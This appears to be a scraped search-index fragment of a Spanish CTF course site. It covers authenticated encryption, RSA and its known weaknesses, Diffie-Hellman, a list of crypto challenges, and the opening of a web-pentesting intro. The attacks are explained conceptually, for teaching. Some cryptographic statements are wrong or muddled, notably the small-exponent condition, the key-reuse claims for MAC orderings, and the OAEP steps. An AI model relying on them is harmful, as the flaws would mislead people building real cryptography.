valores correspondientes al estado luego de correr 10 veces la \u003cem\u003edouble round\u003c/em\u003e son XOReados con los datos, devolviendo el valor cifrado.\u003c/p\u003e\n\u003cp\u003eEl descifrado se ejecuta de la misma forma, dado que XOR es una operación que se cancela a sí misma al ejecutarse dos veces sobre el mismo texto.\u003c/p\u003e\n\u003ch2 id=\"más-allá-del-cifrado\"\u003eMás allá del cifrado\u003c/h2\u003e\n\u003cp\u003eMuchas veces, el cifrado no es suficiente para asegurar que una comunicación entre dos partes ocurre de forma segura. Un ejemplo: Si un mensaje cifrado no contiene metainformación acerca de cuándo fue mandado, un atacante podría reenviar mensajes de una persona a la otra, haciéndola pensar que se dijo nuevamente algo que en verdad no se dijo. Este ataque se denomina \u003ccode\u003eAtaque de Repetición\u003c/code\u003e (o Replay Attack), y se puede evitar agregando información secuencial al mensaje (por ejemplo, un contador monótono para cada participante).\u003c/p\u003e\n\u003cp\u003eOtro problema que puede ocurrir frente a una comunicación cifrada es que el mensaje sea alterado por un atacante antes de llegar al receptor. En el caso del cifrado de flujo, donde la modificación de un byte del texto cifrado altera solamente un byte del texto plano, una modificación de este estilo podría cambiar el significado del mensaje cifrado en una letra o símbolo. Para evitar este problema, es posible \u0026ldquo;autentificar\u0026rdquo; el mensaje a través de \u0026ldquo;message authentication codes\u0026rdquo; (MACs), los cuales permiten demostrar que el mensaje descifrado no ha sido intervenido de ninguna forma.\u003c/p\u003e\n\u003ch3 id=\"mac\"\u003eMAC\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eMessage Authentication Code\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eMAC es el nombre formal de este código extra que se agrega al mensaje cifrado para comprobar su autenticidad. Existen muchas formas de generar un MAC, a continuación nombramos algunas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eHMAC\u003c/strong\u003e se genera a partir de una función de Hash.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGCM\u003c/strong\u003e se genera a partir del uso de un cifrador de bloque (Gallois-Counter mode).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePoly1305\u003c/strong\u003e utiliza polinomios y una función extra (AES, un generador como ChaCha20) para generar aleatoriedad a partir de una semilla.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"enfoques-de-autentificación\"\u003eEnfoques de autentificación\u003c/h4\u003e\n\u003cp\u003eLa autentificación del mensaje se podría realizar en tres puntos distintos. A continuación se muestran diagramas sobre cada forma de autentificar:\u003c/p\u003e\n\u003ch5 id=\"encrypt-then-mac-etm\"\u003e\u003cstrong\u003eEncrypt-Then-MAC (EtM)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../etm.png\" alt=\"Encrypt Then MAC\"\u003e\u003c/p\u003e\n\u003cp\u003eCorresponde a autentificar el mensaje ya cifrado. Es necesario usar una llave distintas para evitar ataques como \u003ca href=\"https://en.wikipedia.org/wiki/CBC-MAC#Using_the_same_key_for_encryption_and_authentication\"\u003eel que se menciona acá\u003c/a\u003e\u003c/p\u003e\n\u003ch5 id=\"encrypt-and-mac-em\"\u003e\u003cstrong\u003eEncrypt-And-MAC (E\u0026amp;M)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../eam.png\" alt=\"Encrypt And MAC\"\u003e\u003c/p\u003e\n\u003cp\u003eEn este caso no hay problemas con usar la misma llave para ambos procesos.\u003c/p\u003e\n\u003ch5 id=\"mac-then-encrypt-mte\"\u003e\u003cstrong\u003eMAC-Then-Encrypt (MtE)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../mte.png\" alt=\"MAC then encrypt\"\u003e\u003c/p\u003e\n\u003cp\u003eEn este caso tampoco hay problemas con usar la misma llave para ambos procesos.\u003c/p\u003e\n\u003cp\u003eMás información sobre cada enfoque se puede encontrar en \u003ca href=\"https://en.wikipedia.org/wiki/Authenticated_encryption#cite_note-14\"\u003eWikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"cifrar-y-autentificar-a-la-vez\"\u003eCifrar y autentificar a la vez\u003c/h3\u003e\n\u003cp\u003eExisten ciertos algoritmos para cifrar datos que integran una rutina de autentificación en el proceso de cifrado. Mencionaremos brevemente dos de los más utilizados:\u003c/p\u003e\n\u003ch3 id=\"aes-gcm-bloque\"\u003eAES-GCM (Bloque)\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eGalois-Counter Mode\u003c/strong\u003e es un modo de cifrado de bloque que además autentifica el mensaje cifrado. Este modo permite autentificar datos anexos a $P$ que necesiten ser autentificados, pero no cifrados. A esta información adicional no cifrada se le suele denominar $A$.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../gcm.png\" alt=\"Galois-Counter Mode\"\u003e\u003c/p\u003e\n\u003cp\u003eMás información sobre el algoritmo de autentificación \u003ca href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\"\u003een Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"chacha20-poly1305-flujo\"\u003eChaCha20-Poly1305 (Flujo)\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eChaCha20-Poly1305\u003c/strong\u003e corresponde al uso combinado del cifrador de flujo ChaCha20 y del MAC Poly1305. Su funcionamiento es explicado en el \u003ca href=\"https://tools.ietf.org/html/rfc8439\"\u003eRFC 8439\u003c/a\u003e. Google seleccionó este algoritmo como reemplazo de RC4 en TLS/SSL. Este algoritmo suele preferirse sobre AES-GCM en hardware que no tiene procesadores optimizados para AES.\u003c/p\u003e\n"},{id:11,href:"/docs/cripto-moderna/cripto-asimetrica/",title:"Criptografía Asimétrica",description:null,content:"\u003cp\u003e\u003cimg src=\"../public_key_crypto.png\" alt=\"Criptografía de llave pública\"\u003e\u003c/p\u003e\n\u003cp\u003eLa \u003cstrong\u003ecriptografía asimétrica\u003c/strong\u003e o \u003cstrong\u003ecriptografía de llave pública\u003c/strong\u003e se diferencia de la criptografía simétrica en que se usan llaves distintas para cifrar y descifrar mensajes, lo que hace posible publicar la llave de cifrado  con el objetivo de que otras personas puedan enviarnos mensajes que solo nosotros podremos descifrar, usando la llave de descifrado. Algo similar ocurre con la criptografía asimétrica usada para firmas digitales. Se usa una llave para \u0026ldquo;demostrar\u0026rdquo; que un mensaje fue enviado por nosotros mientras se publica la otra para que cualquiera pueda comprobar que la firma es válida.\u003c/p\u003e\n\u003cp\u003eEn general, estos sistemas usan propiedades aritméticas para crear problemas matemáticos que son muy difíciles de resolver con información limitada, pero que conociendo un parámetro secreto puedes resolver de forma fácil. A este parámetro se le suele conocer como \u003cem\u003etrapdoor\u003c/em\u003e.\u003c/p\u003e\n\u003ch2 id=\"person-in-the-middle-en-criptografía-asimétrica\"\u003ePerson-in-the-Middle en Criptografía Asimétrica\u003c/h2\u003e\n\u003cp\u003eLos protocolos de criptografía asimétrica más básicos no consideran el problema de validar que la llave pública recibida es de quien dice ser. Nada evita que una tercera entidad que controle el canal de comunicación (Eva) pueda hacerse pasar por Bob frente a Alice, y por Alice frente a bob, generando su propio par de llaves asimétricas $PK$, $SK$ y presentando la llave pública como si fuera la de los interlocutores respectivos de Alice y Bob. Eva recibiría mensajes de Alicia y Bob cifrados con su llave pública, los descifrará con la llave privada y los recifrará con la llave pública de sus interlocutores. Para evitar este problema, se podría firmar la llave pública enviada a la contraparte utilizando algún otro metodo de criptografía de llave pública o privada negociado con anterioridad.\u003c/p\u003e\n\u003ch2 id=\"rsa\"\u003eRSA\u003c/h2\u003e\n\u003cp\u003eRecibe su nombre por las iniciales de sus tres creadores: Rivest, Shamir y Adleman. Es uno de los sistemas criptográficos de llave pública más viejos.\u003c/p\u003e\n\u003ch3 id=\"cifrado\"\u003eCifrado\u003c/h3\u003e\n\u003cp\u003eFue el primer esquema de cifrado de llave pública. Se destaca por el uso de aritmética modular, definiendo los siguientes parámetros:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e$n$ es un número formado por la multiplicación de dos números primos obtenidos al azar $p$ y $q$.\u003c/li\u003e\n\u003cli\u003e$Z_n^*$ es un grupo multiplicativo de enteros módulo $n$.\u003c/li\u003e\n\u003cli\u003e$x$ es nuestro \u003cstrong\u003emensaje en texto plano\u003c/strong\u003e, codificado como un número perteneciente a $Z_n^*$. Debido a lo anterior, el tamaño de nuestro mensaje se encuentra limitado por la magnitud de $n$ (o sea, mientras más grande queramos que sea el mensaje a cifrar, más grande debe ser n).\u003c/li\u003e\n\u003cli\u003e$e$ es nuestro \u003cstrong\u003eexponente público\u003c/strong\u003e y corresponde a un número menor que $(p-1)(q-1)$.\u003c/li\u003e\n\u003cli\u003e$d$ es el inverso multiplicativo de e en el grupo $Z_{(p-1)(q-1)}^*$, o sea, $d = 1/e \\mod (p-1)(q-1)$.\u003c/li\u003e\n\u003cli\u003e$y$ es nuestro \u003cstrong\u003emensaje cifrado\u003c/strong\u003e y se calcula como $x^e \\mod n$.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa \u003cstrong\u003eLlave pública\u003c/strong\u003e en RSA es el par de elementos $(n, e)$, mientras que la \u003cstrong\u003ellave privada\u003c/strong\u003e es el valor $d$.\u003c/p\u003e\n\u003cp\u003eLa gracia de saber que $n=pq$ es que esto nos permite calcular $d$ de forma eficiente, usando el \u003ca href=\"https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm\"\u003ealgoritmo euclidiano extendido\u003c/a\u003e:\u003c/p\u003e\n\u003cp\u003e$extended_gcd(a,b) = ax + by$\u003c/p\u003e\n\u003cp\u003eEn el algoritmo anterior, el valor de $d$ es igual al valor de $a$ al ejecutar $extended_gcd(e, (p-1)(q-1))$.\u003c/p\u003e\n\u003cp\u003eLes recomendamos leer el capítulo 10 del libro \u003cem\u003eSerious Cryptography\u003c/em\u003e para entender por qué ocurre esto.\u003c/p\u003e\n\u003ch4 id=\"cifrado-y-descifrado-en-rsa\"\u003eCifrado y descifrado en RSA\u003c/h4\u003e\n\u003cp\u003ePara cifrar un mensaje en RSA, basta con calcular $y = x^e$, mientras que para descifrar el mensaje, basta con calcular $y^d$, ya que como $d$ es el inverso de $e$, $y^d = x^{e^d} = x^{ed} = x$.\u003c/p\u003e\n\u003cp\u003eEn varias implementaciones, se suele fijar el valor de $e$ a un número pequeño, como por ejemplo $2^16+1$ *(65537), aunque también podría usarse $3$ o $17$ si se usa el padding adecuado (ver sección siguiente para más detalles).\u003c/p\u003e\n\u003ch4 id=\"problemas-de-seguridad-en-rsa\"\u003eProblemas de seguridad en RSA\u003c/h4\u003e\n\u003cp\u003eUna mala implementación de RSA puede generar problemas de seguridad que permitirían incluso descifrar un mensaje. A continuación mencionamos algunos de ellos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e$n$ muy pequeño\u003c/strong\u003e: En general, se suele usar un $n$ de tamaño 2048 bits o más para que el nivel de seguridad del valor cifrado sea similar a un cifrado con llave simétrica de 112 bits. En la práctica, un $n$ de tamaño 300 bits o menos, éste es fácilmente factorizable en un computador de uso personal.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e$e$ muy pequeño y mensajes sin padding\u003c/strong\u003e: Si $e$ es un valor muy pequeño, $x \u0026lt; n^d$ y el mensaje cifrado $y$ no tiene \u003ccode\u003epadding\u003c/code\u003e, es posible calcular la raíz $e$ésima de $y$ para calcular $x$.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMala generación de números primos\u003c/strong\u003e: Es muy importante que los números primos $p$ y $q$ se generen de forma aleatoria. En caso que esto no sea así, se corre el riesgo de encontrarlos, y con esto poder derivar el valor secreto $d$.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProblemas de maleabilidad en valores cifrados\u003c/strong\u003e: Supongamos que ciframos con la misma llave pública dos valores $x_1$ y $x_2$, obteniéndose $y_1$ e $y_2$ respectivamente. Una persona externa podría calcular el valor cifrado de $x_1x_2$ sin conocer $x_1$ y $x_2$ simplemente multiplicando los valores $y_1$ e $y_2$. Para evitar este problema, se suele aplicar un \u003ccode\u003epadding\u003c/code\u003e especial a todos los valores cifrados con RSA, de forma que su representación numérica corresponda a un número grande.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eComputación Cuántica\u003c/strong\u003e El problema de factorización en el cual se basa la seguridad de RSA es resolvible en tiempo polinomial con computadores cuánticos usando el \u003ca href=\"https://en.wikipedia.org/wiki/Shor%27s_algorithm\"\u003ealgoritmo de Shor\u003c/a\u003e. Afortunadamente, todavía no se conoce públicamente la existencia de un computador cuántico con la capacidad de factorizar números del tamaño de los usados en RSA.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa \u003ca href=\"https://en.wikipedia.org/wiki/RSA_(cryptosystem)\"\u003epágina en Wikipedia\u003c/a\u003e menciona con mayor detalle los ataques posibles a RSA, sin embargo, la comprensión de algunos de estos problemas requieren recordar hartos contenidos de teoría de números.\u003c/p\u003e\n\u003ch4 id=\"padding-en-cifrado-rsa-oaep\"\u003ePadding en cifrado RSA: OAEP\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../oaep.jpg\" alt=\"OAEP\"\u003e\u003c/p\u003e\n\u003cp\u003eEl diagrama anterior, obtenido del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e, muestra en términos generales el uso de padding en RSA. Uno de los algoritmos de padding más usados en RSA es OAEP, el cual funciona de la siguiente forma:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../oaep_2.jpg\" alt=\"OAEP\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSe genera $M = H || 000 \u0026hellip; 001 || K$ ($||$ significa concatenar), donde $H$ es una constante conocida de tamaño $h$, seguida de tantos bytes $00$ como sea necesario para que el tamaño de $M$ en bytes sea el mismo que el de $n$, seguido de un byte $01$. Finalmente, se coloca el mensaje original $K$.\u003c/li\u003e\n\u003cli\u003eSe genera un valor $R$ aleatorio de tamaño $h$.\u003c/li\u003e\n\u003cli\u003eLa función $Hash1$ recibe de entrada un valor de largo igual al de $H$ y devuelve un valor de largo igual al de $M$. Llamaremos a este valor $A$\u003c/li\u003e\n\u003cli\u003eLa función $Hash2$ recibe de entrada un valor de largo igual al de $M$ y devuelve un valor de largo igual al de $H$. Llamaremos a este valor $B$\u003c/li\u003e\n\u003cli\u003eEl valor paddeado $P$ se construye de la siguiente forma: $P = 00 || B || A$. Este es el valor que se cifra con RSA finalmente.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEl proceso de descifrado requerirá seguir los pasos anteriores en orden inverso, con el objetivo de obtener el verdadero texto plano.\u003c/p\u003e\n\u003ch3 id=\"firmas\"\u003eFirmas\u003c/h3\u003e\n\u003cp\u003eEn el caso de RSA, para un documento M, se define su firma $S = M^d \\mod n$, donde M es el mensaje a firmar. Para verificar la firma, es necesario calcular $S^e \\mod n$ y comparar este valor con el documento recibido.\u003c/p\u003e\n\u003cp\u003eHay que tener en consideración que, al igual que en el caso de cifrado RSA, el tamaño del mensaje a cifrar está limitado por el tamaño de $n$.\u003c/p\u003e\n\u003ch4 id=\"potenciales-ataques-a-las-firmas-rsa\"\u003ePotenciales ataques a las firmas RSA\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eFirma de mensajes \u0026ldquo;triviales\u0026rdquo;\u003c/strong\u003e: Si no se usa una función de padding, y existe la posibilidad de querer firmar un mensaje como $0$, $1$ o $n-1$. En todos estos casos, $x^d$ es igual a $x$, por lo que no es necesario conocer $d$ para generar la firma del mensaje.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBlinding Attack\u003c/strong\u003e: Si no se usa una función de padding y se quiere obtener la firma de un mensaje $M$ sin que la persona que firma el mensaje se entere que lo firmó, se le puede pasar un mensaje $R^eM$ para firmarlo. La firma de este mensaje corresponderá a $(R^eM)^d = R^{ed}M^d = RM^d$. Este valor se puede dividir por R de forma de obtener $M^d$, que es la firma del mensaje M.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"padding-en-firmas-rsa\"\u003ePadding en firmas RSA\u003c/h4\u003e\n\u003cp\u003eA continuación se mencionan dos algoritmos de padding que suelen usarse en RSA:\u003c/p\u003e\n\u003ch5 id=\"pss\"\u003ePSS\u003c/h5\u003e\n\u003cp\u003eLamentablemente, no hay demostración de que OAEP es un método de padding seguro para firmas RSA. Sin embargo, existe otro algoritmo de padding para este caso, denominado PSS.\u003c/p\u003e\n\u003cp\u003eLa implementación de PSS es algo compleja, por lo que la enlazaremos solamente: \u003ca href=\"https://web.archive.org/web/20170810025803/http://grouper.ieee.org/groups/1363/P1363a/contributions/pss-submission.pdf\"\u003ereferencia\u003c/a\u003e.\u003c/p\u003e\n\u003ch5 id=\"fdh\"\u003eFDH\u003c/h5\u003e\n\u003cp\u003eFull Domain Hash es una forma más simple de paddear un documento, ya que considera simplemente calcular su hash con alguna función de hashing segura y luego firmar ese valor. Formalmente, no está demostrada su seguridad, pero en la práctica se considera una buena función de padding, debido a que su simplicidad disminuye considerablemente la posibilidad de error en implementación que sí posee PSS.\u003c/p\u003e\n\u003ch2 id=\"acuerdo-de-llaves-diffie-hellman\"\u003eAcuerdo de llaves Diffie-Hellman\u003c/h2\u003e\n\u003cp\u003eEn general se considera que Withfeld Diffie y Martin Hellman son los creadores del concepto de criptografía de llave pública. Ellos crearon también un esquema para acordar una llave compartida entre dos partes, denominado generalmente como \u003ccode\u003eprotocolo Diffie-Hellman\u003c/code\u003e. Este protocolo requiere de los siguientes valores:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUn número primo grande $p$ de forma de definir un grupo multiplicativo $Z_p^*$ sobre el cual trabajar.\u003c/li\u003e\n\u003cli\u003eUn número generador $g$, perteneciente a $Z_p^*$. En general se suele usar $g = 2$.\u003c/li\u003e\n\u003cli\u003eCada parte que desea comunicarse debe elegir un número aleatorio en $Z_p^*$. Los denominaremos $a$ y $b$ para $Alicia$ y $Bob$ respectivamente. Estos valores son secretos y nunca se intercambian.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEn este caso, se consideran como llave pública los valores $g^a$ y $g^b$, y como llave privada los valores $a$ y $b$.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../dh.jpg\" alt=\"Diffie Hellman según Serious Cryptography\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePara obtener el valor compartido que usarán como llave simétrica para comunicarse, primero Alicia envía a Bob el número $g^a$ y Bob envía a Alicia el número $g^b$. Si existiese una persona entre medio observando el intercambio, no tendría como deducir $a$ o $b$ a partir de $g^a$ o $g^b$ (al problema de obtener $x$ a partir de un $g^x \\mod p$ se le conoce como de \u003ca href=\"https://en.wikipedia.org/wiki/Discrete_logarithm\"\u003eel problema del logaritmo discreto\u003c/a\u003e y se considera que no existe un método general de resolución para él).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eFinalmente, para calcular el secreto compartido, cada parte eleva el valor recibido por su número aleatorio secreto. De esta forma, Alicia obtendrá $g^{a^b} = g^{ab}$, mientras que Bob obtendrá $g^{b^a} = g^{ba} = g^{ab}$. Ahora, ambas partes pueden usar ese valor compartido para cifrar mensajes.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"problemas-de-seguridad-dh\"\u003eProblemas de seguridad DH\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eReplay Attacks (Ataques de Repetición)\u003c/strong\u003e: Incluso si se pudiera autenticar el mensaje, no hay forma de demostrar si el mensaje que viene de Alicia fue emitido ahora o fue emitido hace tiempo, pero ahora Eva lo está reenviando. Una forma de evitar este problema es agregando interactividad al protocolo de generación del secreto compartido, por ejemplo, pidiendo recibir un \u0026ldquo;valor de confirmación\u0026rdquo; que utilice tanto la llave pública de Alicia como la de Bob en ese momento para su generación.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUso directo de $g^{ab}$ como secreto compartido\u003c/strong\u003e: Sabemos por lo visto que $g^ab$ es un número aleatorio del grupo $Z_p^*$. Sin embargo, esto no significa que sea un número aleatorio (en el sentido que la probabilidad de cada bit de ser 0 o 1 sea la misma), dado que el grupo que forma el generador $g$ podría tener algún sesgo en la codificación de los números generados. Para evitar esta posibilidad, se suele hashear el valor $g^{ab}$ con alguna función resistente a colisiones, como SHA3 o alguna KDF.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-de-curvas-elípticas\"\u003eCriptografía de Curvas Elípticas\u003c/h2\u003e\n\u003cp\u003eLa criptografía de curvas elípticas (ECC) utiliza la estructura algebráica de curvas elípticas sobre cuerpos finitos que puee ser usada tanto para negociación de llaves como para firmas digitales, y tiene la ventaja de que las llaves y firmas producidas en ella suelen ser mucho más pequeñas que las de Diffie-Hellman o RSA, manteniendo el nivel de seguridad. En este curso no trataremos con ellas, pero en caso de querer saber más, recomendamos leer el capítulo 12 del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e.\u003c/p\u003e\n"},{id:12,href:"/docs/cripto-moderna/ejercicios/",title:"Ejercicios Cripto Moderna",description:null,content:"\u003ch2 id=\"recursos-generales\"\u003eRecursos Generales\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://cryptopals.com/\"\u003e\u003cstrong\u003eCryptopals\u003c/strong\u003e\u003c/a\u003e: Ejercicios de implementación de herramientas para ejecutar ataques criptográficos\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-simétrica\"\u003eCriptografía Simétrica\u003c/h2\u003e\n\u003ch3 id=\"hack-the-box\"\u003eHack The Box\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Flippin-Bank\"\u003eFlippin Bank\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Broken-Decryptor\"\u003eBroken Decryptor\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/babyencryption\"\u003eBabyEncryption\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/how-the-columns-have-turned\"\u003eHow the columns have turned\u003c/a\u003e (Retirado)\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/aeswcm\"\u003eAESWCM\u003c/a\u003e (Retirado)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"otros\"\u003eOtros\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://users.dcc.uchile.cl/~eriveros/cc5312/laboratorios/laboratorio-1/\"\u003eLaboratorio 1, Pregunta 2, Curso CC5312 2020/1\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-asimétrica\"\u003eCriptografía Asimétrica\u003c/h2\u003e\n\u003ch3 id=\"hack-the-box-1\"\u003eHack The Box\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/fast-carmichael\"\u003eFast Carmichael\u003c/a\u003e (Retirado)\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/rsactftool\"\u003ersactftool\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/lost-modulus\"\u003eLost Modulus\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/weak-rsa\"\u003eWeak RSA\u003c/a\u003e (Retirado)\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/baby-time-capsule\"\u003eBaby Time Capsule\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"otros-1\"\u003eOtros\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://users.dcc.uchile.cl/~eriveros/cc5312/laboratorios/laboratorio-1/\"\u003eLaboratorio 1, Pregunta 1, Curso CC5312 2020/1\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:13,href:"/docs/apps-web/",title:"Aplicaciones Web",description:"Análisis web, OWASP, técnicas básicas, inyecciones, RCE, CVE, reverse shell",content:""},{id:14,href:"/docs/apps-web/intro/",title:"Intro a Aplicaciones Web",description:null,content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eWeb es uno de los temas más amplios en las competencias de CTF.\nLos challenges se basan principalmente en la explotación de vulnerabilidades reales en los sistemas,\npero también pueden incorporar elementos de otros temas también, como Stego, OSINT o PWN.\nPara efectos de este curso nos centraremos en la detección y explotación de vulnerabilidades comunes,\nmientras que la resolución de los challenges surgirá casi como un efecto secundario.\u003c/p\u003e\n\u003cp\u003eYa que este tema hace un fuerte uso de vulnerabilidades reales, al practicar para este tipo de challenges\ntambién están estudiando para hacer análisis de seguridad a sitios web de verdad. De hecho,\nel penetration testing, o pentesting, de páginas web es el trabajo más solicitado a los especialistas en seguridad computacional.\nEs más, algunas empresas buscan activamente a gente con habilidades en estos temas por medio de CTFs,\npara luego ofrecerles trabajo.\u003c/p\u003e\n\u003cp\u003eSimilarmente a los otros temas que hemos visto en este curso, las flags de los challenges web pueden estar\nen casi cualquier lado. Desde el código fuente HTML, pasando por parámetros retornados por el\nservidor, y hasta pueden estar escondidas en una base de datos o en un archivo no visible desde internet.\nPero dentro de toda esta inmensidad de posibilidades, ustedes se deben guiar por las vulnerabilidades\ny los recursos ganados al explotarlas.\u003c/p\u003e\n\u003ch2 id=\"análisis-básico-de-aplicaciones-web\"\u003eAnálisis Básico de Aplicaciones Web\u003c/h2\u003e\n\u003cp\u003eEl análisis de aplicaciones web abarca temas muy amplios y se puede volver muy complejo, pero en su objetivo\nfundamental es siempre el mismo: realizar acciones (ya sea leer, crear o modificar datos, ejecutar comandos,\nu obtener privilegios diferentes) las cuales no son deseables por el dueño del sistema. Esto es, \u0026ldquo;hackear\u0026rdquo;\nla página. Existen muchas técnicas, herramientas y procedimientos distintos que ayudan en este proceso,\npero en su forma más básica (similar al debugging de cualquier software),\nesto se divide en análisis estático y análisis dinámico.\u003c/p\u003e\n\u003ch3 id=\"análisis-estático\"\u003eAnálisis Estático\u003c/h3\u003e\n\u003cp\u003eSe refiere al análisis de elementos estáticos de un sitio web, como archivos HTML y JavaScript, código fuente,\nrestricciones de uso para ciertos campos (por ejemplo largo de la entrada, caracteres permitidos, etc).\nUsualmente este es el primer paso para analizar un sitio web, con el cual se empieza a entender el funcionamiento\nprincipal de la página, se encuentran las tecnologías utilizadas y de vez en cuando aparecen ciertos elementos\nque no deberían estar visibles y que divulgan cierta información.\u003c/p\u003e\n\u003cp\u003eEste tipo de análisis es bastante simple y usualmente no se necesita más que un navegador. El más utilizado\nen el área de seguridad es \u003ca href=\"https://www.mozilla.org/en-US/firefox/new/\"\u003eFireFox\u003c/a\u003e, ya que se suele comportar\nun poco mejor con las otras herramientas que se utiliza. En particular, se utiliza las herramientas de\ndesarrollador (Developer Tools), a las cuales pueden acceder presionando F12. Aquí nos interesa principalmente\nel \u003cem\u003eDebugger\u003c/em\u003e para ver las dependencias y diferentes recursos utilizados por el sitio, el \u003cem\u003eInspector\u003c/em\u003e para analizar\nel código fuente HTML, la \u003cem\u003eConsole\u003c/em\u003e en donde pueden aparecer mensajes o información relevante, y el \u003cem\u003eStorage\u003c/em\u003e\nen donde se almacena cookies y otra información de manera local.\u003c/p\u003e\n\u003ch3 id=\"análisis-dinámico\"\u003eAnálisis Dinámico\u003c/h3\u003e\n\u003cp\u003eEl análisis dinámico incluye toda la revisión de requests hechas al servidor, junto a sus respuestas respectivas,\nla generación de requests diferentes a los usualmente utilizados por el servicio, y en general a todo lo que\ntenga que ver con interactuar con el servidor. Aquí es donde se encuentra la gran mayoría de las vulnerabilidades\ny formas de explotar el servicio. La forma de realizar el análisis y sus resultados dependen fuertemente\nde las tecnologías (lenguajes, frameworks, librerías, filtros, etc) usadas en el sitio web.\u003c/p\u003e\n\u003cp\u003ePara hacer esto, las herramientas más típicas son proxies. El más usado es \u003ca href=\"https://portswigger.net/burp/communitydownload\"\u003eBurp Suite Community Edition\u003c/a\u003e,\no \u003ca href=\"https://portswigger.net/burp/pro\"\u003eBurp Suite Professional\u003c/a\u003e si trabajan en una empresa o pueden costearlo.\nEste no solo sirve de proxy, sino que además incluye algunas otras herramientas que ayudan a analizar consultas\ne interactuar con el servidor. Durante este curso lo usaremos bastante, por lo que es recomendado instalarlo,\njunto a algún plugin para redirigir las consultas, como por ejemplo \u003ca href=\"https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/\"\u003eFoxyProxy\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"vulnerabilidades\"\u003eVulnerabilidades\u003c/h2\u003e\n\u003cp\u003eHasta ahora hemos mencionado a las vulnerabilidades, pero no hemos visto qué son. En resumen, una vulnerabilidad\nse refiere a cualquier debilidad que, en teoría, produce comportamiento no deseado en el sistema,\nel cual tiene el potencial de perjudicar a alguno de los agentes involucrados (dueños del sistema, usuarios, terceros,\netc).\u003c/p\u003e\n\u003cp\u003eLa implementación de un ataque que se aprovecha de una vulnerabilidad se denomina explotación o \u003cem\u003eexploit\u003c/em\u003e.\nEl request (o parte del request) que gatilla este exploit al servidor y que causa el comportamiento\nno deseado se llama \u003cem\u003epayload\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003eUna mitigación es una contramedida que en 